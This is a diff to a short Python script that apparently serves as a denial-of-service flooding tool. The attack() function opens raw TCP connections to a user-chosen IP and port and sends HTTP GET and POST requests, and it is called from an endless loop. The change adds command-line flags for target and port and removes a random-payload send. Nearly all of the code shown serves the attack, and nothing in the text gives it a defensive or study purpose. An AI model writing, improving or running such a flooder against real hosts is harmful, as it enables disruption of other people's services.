@@ -1,11 +1,13 @@
-import socket, sys, os, random, string
-IP_ADDR=sys.argv[1]
-PORT=80
+import socket, sys, os, random, string, argparse
 
-def rand(size=20, chars=string.ascii_uppercase + string.digits):
-    return ''.join(random.choice(chars) for _ in range(size))
 
-mess=bytes(rand().encode())
+ps = argparse.ArgumentParser()
+ps.add_argument('-ip', type=str, required=True)
+ps.add_argument('-p', type=int, required=True)
+arg=ps.parse_args()
+
+IP_ADDR=arg.ip
+PORT=arg.p
 
 def attack():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -14,7 +16,6 @@ def attack():
     s.send(request.encode())
     request2 = "POST / HTTP/1.1\r\nHost:%s\r\n\r\n" % IP_ADDR
     s.send(request2.encode())
-    s.send(mess)
     s.close()
     
 while True:  
